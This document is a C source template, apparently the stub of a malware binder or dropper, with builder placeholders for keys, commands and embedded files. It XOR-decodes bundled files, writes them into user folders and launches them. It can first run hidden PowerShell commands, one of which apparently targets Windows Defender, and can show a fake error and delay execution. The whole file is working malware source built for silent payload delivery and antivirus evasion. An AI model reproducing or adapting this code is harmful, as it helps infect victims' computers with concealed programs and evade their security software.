#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <ShellAPI.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, long dataLen) {
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ "#DKEY"[i % #DKEYLENGTH];
	}
	return output;
}

int main(int argc, char **argv) 
{
#if DefError
	ShellExecuteA(NULL, "#STROPEN", "#STRPOWERSHELL", "#ERRORCOMMAND", NULL, SW_HIDE);
#endif
#if DefDelay
	sleep(#DELAY * 1000);
#endif
#if DefWD
	ShellExecuteA(NULL, "#STROPEN", "#STRPOWERSHELL", "#WDCOMMAND", NULL, SW_HIDE);
#endif
	char* stringarray[$ARRAYCOUNT][3] = {$STRINGARRAY};
	long intarray[$ARRAYCOUNT][4] = {$INTARRAY};

	char commandholder[MAX_PATH*4];

	for(int i = 0; i < $ARRAYCOUNT; ++i){
		if (strcmp(stringarray[i][0], "#STRCURDIR") == 0) {
			strcpy(commandholder, cipher(stringarray[i][1], intarray[i][1]));
		}
		else {
			sprintf(commandholder, "%s\\%s", getenv(cipher(stringarray[i][0], intarray[i][0])), cipher(stringarray[i][1], intarray[i][1]));
		}
		FILE *write_ptr = fopen(commandholder, "wb");
		fwrite(cipher(stringarray[i][2], intarray[i][2]), intarray[i][2], 1, write_ptr);
		fclose(write_ptr);
		if(intarray[i][3]){
			ShellExecuteA(NULL, "#STROPEN", commandholder, NULL, NULL, SW_SHOWDEFAULT);
		}
	}
}